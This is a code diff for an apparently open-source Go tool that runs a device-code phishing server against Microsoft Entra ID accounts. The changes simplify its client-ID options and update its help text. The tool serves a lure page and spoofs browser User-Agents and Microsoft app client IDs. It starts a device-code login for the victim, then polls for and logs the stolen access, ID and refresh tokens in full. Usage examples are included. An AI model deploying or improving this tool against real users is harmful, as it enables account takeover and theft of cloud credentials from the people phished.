@@ -63,21 +63,19 @@ var (
 	customUserAgent string
 	userAgent       string
 	clientId        string
-	clientIds       []string
-	customClientIds []string
+	customClientId  string
 	tenant          string
 	pathPrefix      string
 )
 
 func init() {
 	rootCmd.AddCommand(runCmd)
-	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
-	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Choose predefined User-Agent (see options below)")
+	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Server listening address")
+	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Predefined User-Agent to use (see --help for list)")
 	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
-	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token (legacy support)")
-	runCmd.Flags().StringSliceVar(&clientIds, "client-ids", []string{}, "List of predefined ClientIds to use (see options below, comma-separated)")
-	runCmd.Flags().StringSliceVar(&customClientIds, "custom-client-ids", []string{}, "List of custom ClientIds (comma-separated)")
-	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
+	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
+	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
+	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
 	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path prefix for the lure URL (e.g., /custom)")
 }
 
@@ -86,7 +84,7 @@ var runCmd = &cobra.Command{
 	Short: "Starts the phishing server",
 	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure
 
-Predefined User-Agent options:
+Available User-Agent options for --user-agent:
   firefox-android        - Firefox on Android
   chrome-android         - Chrome on Android
   edge-android          - Edge on Android
@@ -104,7 +102,8 @@ Predefined User-Agent options:
   safari-ios            - Safari on iOS
   firefox-ios           - Firefox on iOS
 
-Predefined ClientId options:
+Available ClientId options for --client-id:
+  msauthbroker          - Microsoft Authentication Broker (default)
   office365             - Office 365 Management
   azurecli              - Microsoft Azure CLI
   azurepowershell       - Microsoft Azure PowerShell
@@ -116,15 +115,25 @@ Predefined ClientId options:
   office                - Microsoft Office
   visualstudio          - Visual Studio
   onedriveios           - OneDrive iOS App
-  bingsearch            - Microsoft Bing Search for Microsoft Edge
+  bingsearch            - Microsoft Bing Search for Edge
   stream                - Microsoft Stream Mobile Native
   teamsadmin            - Microsoft Teams - Device Admin Agent
   bing                  - Microsoft Bing Search
-  msauthbroker          - Microsoft Authentication Broker
 
-Examples: 
-  DeviceCodePhishing server --user-agent firefox-android --client-ids msteams,office
-  DeviceCodePhishing server --custom-client-ids "your-custom-id"`,
+Examples:
+  # Using predefined options
+  DeviceCodePhishing server --user-agent chrome-android --client-id msteams
+  
+  # Using custom ClientId  
+  DeviceCodePhishing server --custom-client-id "your-custom-clientid-guid"
+  
+  # With custom path
+  DeviceCodePhishing server --path /auth --client-id azurecli
+  
+  # With custom user agent
+  DeviceCodePhishing server --custom-user-agent "Mozilla/5.0..." --client-id office365
+  
+Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// Determine which user agent to use
 		finalUserAgent := customUserAgent
@@ -132,39 +141,40 @@ Examples:
 			if ua, ok := predefinedUserAgents[userAgent]; ok {
 				finalUserAgent = ua
 			} else {
-				slog.Error("Invalid user-agent choice", "available", strings.Join(getAvailableUserAgents(), ", "))
+				slog.Error("Invalid user-agent", "provided", userAgent, "available", strings.Join(getAvailableUserAgents(), ", "))
 				os.Exit(1)
 			}
 		}
 
-		// Determine which ClientIds to use
-		finalClientIds := []string{}
+		// Determine which ClientId to use
+		finalClientId := ""
 
-		// Add predefined ClientIds
-		if len(clientIds) > 0 {
-			for _, predefined := range clientIds {
-				if cid, ok := predefinedClientIds[predefined]; ok {
-					finalClientIds = append(finalClientIds, cid)
-				} else {
-					slog.Error("Invalid client-id choice", "available", strings.Join(getAvailableClientIds(), ", "))
-					os.Exit(1)
-				}
+		// Check if both client-id and custom-client-id are provided
+		if clientId != "" && customClientId != "" {
+			slog.Error("Cannot specify both --client-id and --custom-client-id",
+				"clientId", clientId,
+				"customClientId", customClientId)
+			os.Exit(1)
+		}
+
+		// Use predefined ClientId
+		if clientId != "" {
+			if cid, ok := predefinedClientIds[clientId]; ok {
+				finalClientId = cid
+			} else {
+				slog.Error("Invalid client-id", "provided", clientId, "available", strings.Join(getAvailableClientIds(), ", "))
+				os.Exit(1)
 			}
 		}
 
-		// Add custom ClientIds
-		if len(customClientIds) > 0 {
-			finalClientIds = append(finalClientIds, customClientIds...)
+		// Use custom ClientId
+		if customClientId != "" {
+			finalClientId = customClientId
 		}
 
-		// Handle backward compatibility with single client-id flag
-		if clientId != MsAuthenticationBroker && len(finalClientIds) == 0 {
-			finalClientIds = []string{clientId}
-		}
-
-		// If no ClientIds specified, use default
-		if len(finalClientIds) == 0 {
-			finalClientIds = []string{MsAuthenticationBroker}
+		// If no ClientId specified, use default
+		if finalClientId == "" {
+			finalClientId = MsAuthenticationBroker
 		}
 
 		// Sanitize path prefix
@@ -175,19 +185,9 @@ Examples:
 			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
 		}
 
-		// Set up resource handlers for each client ID
-		for i, cid := range finalClientIds {
-			lurePath := pathPrefix + "/lure"
-			if len(finalClientIds) > 1 {
-				lurePath = lurePath + "/" + cid
-			}
-			http.HandleFunc(lurePath, getLureHandler(cid, finalUserAgent))
-
-			if i == 0 {
-				// Also register the base path for the first clientId (backward compatibility)
-				http.HandleFunc(pathPrefix+"/lure", getLureHandler(cid, finalUserAgent))
-			}
-		}
+		// Set up a single resource handler
+		lurePath := pathPrefix + "/lure"
+		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent))
 
 		host, port, err := net.SplitHostPort(address)
 		if err != nil || port == "" {
@@ -200,24 +200,16 @@ Examples:
 			Addr: address,
 		}
 
-		slog.Info("Start Server", "tenant", tenant)
-		slog.Info("Using User-Agent", "userAgent", finalUserAgent)
-		for _, cid := range finalClientIds {
-			slog.Info("ClientId", "id", cid)
-		}
+		slog.Info("Start Server",
+			"tenant", tenant,
+			"clientId", finalClientId,
+			"userAgent", finalUserAgent)
 
 		if host == "" {
 			host = "localhost"
 		}
 
-		if len(finalClientIds) == 1 {
-			slog.Info("Lure address", "url", host+":"+port+pathPrefix+"/lure")
-		} else {
-			slog.Info("Base lure address", "url", host+":"+port+pathPrefix+"/lure")
-			for _, cid := range finalClientIds {
-				slog.Info("Client-specific lure", "url", host+":"+port+pathPrefix+"/lure/"+cid)
-			}
-		}
+		slog.Info("Lure available at", "url", "http://"+host+":"+port+lurePath)
 
 		// Listen to HTTP connections and wait
 		log.Fatal(server.ListenAndServe())
@@ -226,14 +218,14 @@ Examples:
 
 func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		slog.Info("Lure opened", "clientId", clientId)
+		slog.Info("Lure opened", "clientId", clientId, "remoteAddr", r.RemoteAddr)
 
 		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)
 
 		scopes := []string{"openid", "profile", "offline_access"}
 		deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
 		if err != nil {
-			slog.Error("Error during starting device code flow", "error", err)
+			slog.Error("Error starting device code flow", "error", err)
 			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 			return
 		}
@@ -254,7 +246,7 @@ func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceA
 
 	for {
 		time.Sleep(pollInterval)
-		slog.Info("Check for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
+		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
 		result, err := entra.RequestToken(tenant, clientId, deviceAuth)
 
 		if err != nil {
@@ -263,9 +255,10 @@ func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceA
 		}
 
 		if result != nil {
-			slog.Info("AccessToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "accessToken", result.AccessToken)
-			slog.Info("IdToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "idToken", result.IdToken)
-			slog.Info("RefreshToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "refreshToken", result.RefreshToken)
+			slog.Info("Token received", "userCode", deviceAuth.UserCode, "clientId", clientId)
+			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
+			slog.Info("ID TOKEN:", "token", result.IdToken)
+			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
 			return
 		}
 	}
